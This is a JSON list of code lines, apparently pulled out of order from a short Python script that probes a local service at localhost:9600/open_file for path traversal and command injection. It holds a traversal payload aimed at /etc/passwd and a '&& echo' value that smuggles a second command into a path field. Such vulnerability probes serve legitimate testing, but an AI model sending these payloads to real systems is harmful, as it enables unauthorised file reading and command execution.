[
    {
        "line": 10,
        "fullcodeline": "payload = \"../../../../../../../../../../etc/passwd\""
    },
    {
        "line": 11,
        "fullcodeline": "url = \"http://localhost:9600/open_file\""
    },
    {
        "line": 12,
        "fullcodeline": "data = {\"path\": payload}"
    },
    {
        "line": 14,
        "fullcodeline": "response = requests.post(url, json=data)"
    },
    {
        "line": 24,
        "fullcodeline": "payload = \"&& echo 'Command Injection Test'\""
    },
    {
        "line": 25,
        "fullcodeline": "data = {\"path\": payload}"
    },
    {
        "line": 27,
        "fullcodeline": "response = requests.post(url, json=data)"
    },
    {
        "line": 15,
        "fullcodeline": "if response.status_code == 200:"
    },
    {
        "line": 28,
        "fullcodeline": "if response.status_code == 200:"
    },
    {
        "line": 21,
        "fullcodeline": "print(\"Error: \", response.status_code)"
    },
    {
        "line": 34,
        "fullcodeline": "print(\"Error: \", response.status_code)"
    },
    {
        "line": 16,
        "fullcodeline": "if \"root:x\" in response.text:"
    },
    {
        "line": 29,
        "fullcodeline": "if \"Command Injection Test\" in response.text:"
    },
    {
        "line": 17,
        "fullcodeline": "print(\"Path Traversal vulnerability found!\")"
    },
    {
        "line": 19,
        "fullcodeline": "print(\"Path Traversal vulnerability not found.\")"
    },
    {
        "line": 30,
        "fullcodeline": "print(\"Command Injection vulnerability found!\")"
    },
    {
        "line": 32,
        "fullcodeline": "print(\"Command Injection vulnerability not found.\")"
    }
]